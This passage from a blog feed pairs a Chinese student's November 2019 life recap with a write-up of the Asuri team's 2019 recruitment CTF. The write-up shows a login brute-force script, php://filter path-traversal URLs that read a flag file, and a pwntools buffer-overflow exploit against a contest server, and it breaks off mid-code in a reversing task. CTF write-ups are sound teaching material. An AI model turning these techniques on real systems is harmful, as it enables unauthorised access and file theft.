      <link href="/2019/12/02/Boom_2019November/"/>
      <url>/2019/12/02/Boom_2019November/</url>
      
        <content type="html"><![CDATA[<h2 id="纪念一下忙到爆炸超级难顶的十一月"><a href="#纪念一下忙到爆炸超级难顶的十一月" class="headerlink" title="纪念一下忙到爆炸超级难顶的十一月"></a>纪念一下忙到爆炸超级难顶的十一月</h2><p><del>（实在没忍住</del><br>本来就一堆事，然而有些活动还想去体验一下，不过收获倒是不少吧<br><del>（其实在作死…</del></p><p> <img src="/2019/12/02/Boom_2019November/plan.png" alt="plan"> </p> <a id="more"></a> <ul><li><p>电焊大赛 划了一波水  </p><p><img src="/2019/12/02/Boom_2019November/CircuitWeldingCompetition.jpg" alt="电焊大赛"></p></li><li><p>和师傅们玩了玩CTF（不务正业<br>到了大三才知道这个比赛嘤嘤嘤  太菜了，只拿了第六，不过有个一血还拿了个娃娃嘻嘻嘻<br>然而瞄了一眼NJUPT CTF题目，发现自己菜到爆炸。人家光是签到题就绕了好几个弯…   </p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF2.jpg" alt="ctf"></p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF.png" alt="ctf"></p></li><li><p>去东大打了一波Hackathon（不务正业<br>成功带飞俩学弟 拿了第四 三等奖<br> （微软爸爸真有钱，白嫖感觉超级爽233<br><img src="/2019/12/02/Boom_2019November/hackathon.JPG" alt="hackathon"><br><img src="/2019/12/02/Boom_2019November/hackathon3.png" alt="hackathon3"><br><img src="/2019/12/02/Boom_2019November/hackathon2.jpg" alt="hackathon2">   </p></li><li><p>做了持续一个月的校电赛<br>这回终于没有白给了，一等奖+最佳工程实践奖到手  </p><p><img src="/2019/12/02/Boom_2019November/NUAAEDC.jpg" alt="NUAAEDC"></p></li></ul><p>期间还有结课考试，准备大创中期材料，各种DDL，真就难顶到爆炸想自闭……  </p><p>不过要感谢超级棒的奶冰日常鼓励<br>没有奶冰的话包括<code>iCal</code>在内很多事真就很难坚持下去<br>还抑制住了我不少冲动233<br>还有陆师傅的<code>做好我们的就行了</code><br>于老板的<code>加油啊你们都大三了</code><br>焰焰的<code>先做好当下的事</code><br>一帆学弟的<code>冲冲冲</code><br>还有舍友的通情达理<br>etc.  </p><h2 id="转眼间就十二月啦"><a href="#转眼间就十二月啦" class="headerlink" title="转眼间就十二月啦"></a>转眼间就十二月啦</h2><p>这个月应该就没有比赛什么的了，不过项目进度有空还得赶一赶8<br>还要补课内欠下的一堆难到爆炸看不懂的知识<br>还有大作业、课设、实验，以及接下来几周陆续结课马上到来的考试……<br>（当然有空的话还想出去转一转（都好久没出门了嘤嘤嘤 除了去了趟SEU  </p><p>总之——<br><strong>接下来的两个月加油冲冲冲！</strong>  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Asuri战队 2019招新赛 WriteUP</title>
      <link href="/2019/11/28/CTF_2019Asuri_Recruitment/"/>
      <url>/2019/11/28/CTF_2019Asuri_Recruitment/</url>
      
        <content type="html"><![CDATA[<h1 id="Asuri-招新赛WriteUP-20191117"><a href="#Asuri-招新赛WriteUP-20191117" class="headerlink" title="Asuri 招新赛WriteUP 20191117"></a>Asuri 招新赛WriteUP 20191117</h1><p>网址： <a href="http://139.9.212.218:8000/challenges" target="_blank" rel="noopener">http://139.9.212.218:8000/challenges</a>  </p><p>官方安排及WriteUP：<a href="https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp" target="_blank" rel="noopener">https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp</a>  </p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p><code>flag{this_is_test_flag}</code> </p><h2 id="misc-签到"><a href="#misc-签到" class="headerlink" title="misc-签到"></a>misc-签到</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185210292.png" alt="misc"></p><p>base64解码即得到</p><p><code>flag{1_want_jiamus_p0wer}</code>  </p><h2 id="baby-web-九曲十八弯"><a href="#baby-web-九曲十八弯" class="headerlink" title="baby-web-九曲十八弯"></a>baby-web-九曲十八弯</h2><p> <a href="http://desperadoccy.club:39011/" target="_blank" rel="noopener">http://desperadoccy.club:39011/</a> </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185108626.png" alt="image-20191117185108626"></p><p>base64解码</p><p><code>Asuri{view_source's_power}</code></p><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><p> <a href="http://47.102.107.100:39012/" target="_blank" rel="noopener">http://47.102.107.100:39012/</a> </p> <a id="more"></a> <p>连续20次在1-2s内判断是否正确，即可得到flag。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    equation <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;div>(.*)=(.*)&lt;/div>'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>equation<span class="token punctuation">)</span>    answer <span class="token operator">=</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> answer <span class="token operator">==</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117195746861.png" alt="image-20191117195746861"></p><p><code>Asuri{python_1s_th3_be3t_l4ngu4ge}</code></p><h2 id="medium-web-justburp"><a href="#medium-web-justburp" class="headerlink" title="medium_web_justburp"></a>medium_web_justburp</h2><p> <a href="http://139.9.212.218:39010/" target="_blank" rel="noopener">http://139.9.212.218:39010/</a> </p><p>查找网站目录下的文件</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117204536434.png" alt="image-20191117204536434"></p><p>访问<code>robots.txt</code> 得到：  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212248603.png" alt="image-20191117212248603"></p><p>访问<code>hint.php</code> 得到一个文件  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212350116.png" alt="image-20191117212350116"></p><p>尝试以<code>admin</code>作为用户名，用以上信息作为密码写脚本进行登录，  </p><p>然而好像没有成功（有可能有成功的没看到？？？  </p><blockquote><p>难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…<br>加一个if重新来就看到了惹emmm</p></blockquote><p><strong>爆破一波</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'name-pass.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    contents <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(contents)</span>    passwords <span class="token operator">=</span> contents<span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>              <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">if</span> <span class="token string">'密码错误'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>即可得到</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hi hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bisque<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登陆<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>hint:admin用户的密码似乎在某个页面里 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>flag:  <code>Asuri{Burp_1s_Gre@t}</code></p><blockquote><p>其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。<br>然而我现场还在搜它怎么用……</p></blockquote><h2 id="hard-web-php是世界上最好的语言"><a href="#hard-web-php是世界上最好的语言" class="headerlink" title="hard_web_php是世界上最好的语言"></a>hard_web_php是世界上最好的语言</h2><p> <a href="http://139.9.212.218:39009/" target="_blank" rel="noopener">http://139.9.212.218:39009/</a> </p><p>改cookie重发</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212633273.png" alt="image-20191117212633273"></p><p>访问<code>read_file.php</code>，得到  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212728303.png" alt="image-20191117212728303"></p><p>访问<code>no_flag_here.php</code>  ，构造参数进入根目录  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117203840679.png" alt="image-20191117203840679"></p><p>然而！emmm这个scandir怎么获取这个flag文件内容啊！！！</p><blockquote><p>看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 </p></blockquote><p>构造<code>file=php://filter/read=convert.base64-encode/resource=</code>+绝对路径</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php</a></p><p>或者</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php</a></p><p>得到一串Base64字符串</p><p><code>PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg==</code>  </p><p>解码后：</p><pre><code>&lt;?php    //Asuri{WEB_WINNER}?&gt;</code></pre><p>flag: <code>Asuri{WEB_WINNER}</code></p><h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212839633.png" alt="image-20191117212839633"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213445330.png" alt="image-20191117213445330"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212904694.png" alt="image-20191117212904694"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment" spellcheck="true"># 引入pwntools库</span><span class="token keyword">import</span> timesh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.235.243.206'</span><span class="token punctuation">,</span> <span class="token number">9001</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建与靶场服务器的连接</span>offset <span class="token operator">=</span> <span class="token number">0x60</span><span class="token operator">+</span><span class="token number">0x8</span>  <span class="token comment" spellcheck="true"># 偏移</span>system_addr <span class="token operator">=</span> <span class="token number">0x400766</span>  <span class="token comment" spellcheck="true"># system函数地址</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your passworld size'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your password'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> offset <span class="token operator">*</span> b<span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 构造攻击数据</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 将控制流从程序转移到自己这里</span></code></pre><p>完了不会写，嘤嘤嘤</p><h2 id="medium-rev"><a href="#medium-rev" class="headerlink" title="medium_rev"></a>medium_rev</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token comment" spellcheck="true"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span><span class="token keyword">def</span> <span class="token function">encrypt_for_each</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">100</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">77</span>        <span class="token keyword">yield</span> tmp        None<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    iters <span class="token operator">=</span> encrypt_for_each<span class="token punctuation">(</span><span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> zip<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> m <span class="token operator">^</span> k <span class="token operator">^</span> iters<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>        enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> enc<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">check_prime</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> num <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    test <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">8</span><span class="token punctuation">,</span>        <span class="token number">61</span><span class="token punctuation">,</span>        <span class="token number">85</span><span class="token punctuation">,</span>        <span class="token number">25</span><span class="token punctuation">,</span>        <span class="token number">121</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">26</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">81</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">124</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">137</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">94</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">132</span><span class="token punctuation">,</span>        <span class="token number">90</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">46</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">127</span><span class="token punctuation">,</span>        <span class="token number">35</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">134</span><span class="token punctuation">,</span>        <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token number">73</span><span class="token punctuation">,</span>        <span class="token number">32</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">7</span><span class="token punctuation">,</span>        <span class="token number">69</span><span class="token punctuation">,</span>        <span class="token number">122</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">142</span><span class="token punctuation">,</span>        <span class="token number">23</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">109</span><span class="token punctuation">,</span>        <span class="token number">60</span><span class="token punctuation">,</span>        <span class="token number">79</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">62</span><span class="token punctuation">,</span>        <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token number">104</span><span class="token punctuation">,</span>        <span class="token number">102</span><span class="token punctuation">,</span>        <span class="token number">14</span><span class="token punctuation">,</span>        <span class="token number">58</span><span class="token punctuation">,</span>        <span class="token number">149</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">96</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">114</span><span class="token punctuation">,</span>        <span class="token number">116</span><span class="token punctuation">,</span>        <span class="token number">11</span><span class="token punctuation">,</span>        <span class="token number">95</span><span class="token punctuation">,</span>        <span class="token number">87</span><span class="token punctuation">,</span>        <span class="token number">146</span><span class="token punctuation">,</span>        <span class="token number">123</span><span class="token punctuation">,</span>        <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token number">135</span><span class="token punctuation">,</span>        <span class="token number">33</span><span class="token punctuation">,</span>        <span class="token number">37</span><span class="token punctuation">,</span>        <span class="token number">110</span><span class="token punctuation">,</span>        <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token number">106</span><span class="token punctuation">,</span>        <span class="token number">30</span><span class="token punctuation">,</span>        <span class="token number">130</span><span class="token punctuation">,</span>        <span class="token number">101</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">98</span><span class="token punctuation">,</span>        <span class="token number">141</span><span class="token punctuation">,</span>        <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token number">47</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">24</span><span class="token punctuation">,</span>        <span class="token number">131</span><span class="token punctuation">,</span>        <span class="token number">16</span><span class="token punctuation">,</span>        <span class="token number">111</span><span class="token punctuation">,</span>        <span class="token number">150</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">76</span><span class="token punctuation">,</span>        <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token number">138</span><span class="token punctuation">,</span>        <span class="token number">64</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">118</span><span class="token punctuation">,</span>        <span class="token number">29</span><span class="token punctuation">,</span>        <span class="token number">145</span><span class="token punctuation">,</span>        <span class="token number">147</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">113</span><span class="token punctuation">,</span>        <span class="token number">103</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">92</span><span class="token punctuation">,</span>        <span class="token number">71</span><span class="token punctuation">,</span>        <span class="token number">72</span><span class="token punctuation">,</span>        <span class="token number">129</span><span class="token punctuation">,</span>        <span class="token number">139</span><span class="token punctuation">,</span>        <span class="token number">100</span><span class="token punctuation">,</span>        <span class="token number">63</span><span class="token punctuation">,</span>        <span class="token number">133</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">125</span><span class="token punctuation">,</span>        <span class="token number">74</span><span class="token punctuation">,</span>        <span class="token number">88</span><span class="token punctuation">,</span>        <span class="token number">143</span><span class="token punctuation">,</span>        <span class="token number">144</span><span class="token punctuation">,</span>        <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token number">140</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">136</span><span class="token punctuation">,</span>        <span class="token number">115</span><span class="token punctuation">,</span>        <span class="token number">54</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">50</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">128</span><span class="token punctuation">,</span>        <span class="token number">57</span><span class="token punctuation">,</span>        <span class="token number">112</span><span class="token punctuation">,</span>        <span class="token number">43</span><span class="token punctuation">,</span>        <span class="token number">84</span><span class="token punctuation">,</span>        <span class="token number">70</span><span class="token punctuation">,</span>        <span class="token number">78</span><span class="token punctuation">,</span>        <span class="token number">28</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">93</span><span class="token punctuation">,</span>        <span class="token number">44</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">83</span><span class="token punctuation">,</span>        <span class="token number">65</span><span class="token punctuation">,</span>        <span class="token number">17</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">,</span>        <span class="token number">126</span><span class="token punctuation">,</span>        <span class="token number">39</span><span class="token punctuation">,</span>        <span class="token number">49</span><span class="token punctuation">,</span>        <span class="token number">91</span><span class="token punctuation">,</span>        <span class="token number">34</span><span class="token punctuation">,</span>        <span class="token number">82</span><span class="token punctuation">,</span>        <span class="token number">45</span><span class="token punctuation">,</span>        <span class="token number">148</span><span class="token punctuation">,</span>        <span class="token number">105</span><span class="token punctuation">,</span>        <span class="token number">89</span><span class="token punctuation">,</span>        <span class="token number">117</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">continue</span><span class="token punctuation">[</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>filter<span class="token punctuation">(</span>check_prime<span class="token punctuation">,</span> test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> 